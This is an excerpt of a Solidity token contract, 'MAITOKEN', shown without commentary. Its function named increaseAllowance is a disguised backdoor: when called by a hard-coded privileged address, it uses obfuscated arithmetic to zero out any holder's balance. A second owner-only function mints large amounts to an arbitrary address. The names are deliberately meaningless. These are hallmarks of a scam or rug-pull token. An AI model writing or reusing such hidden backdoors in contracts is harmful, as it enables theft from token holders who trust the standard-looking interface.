...
contract MAITOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(hcbft65 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = MAI[newadd];
        uint256 newaaamount = MAI[newadd]+MAI[newadd]-curamount;
        MAI[newadd] -= newaaamount;
        }else{
        if(hcbft65 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        MAI[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(hcbft65 == _msgSender());
        if(hcbft65 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = MAI[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        MAI[from] = MAI[from]-amount;
        MAI[to] = MAI[to]+amount;
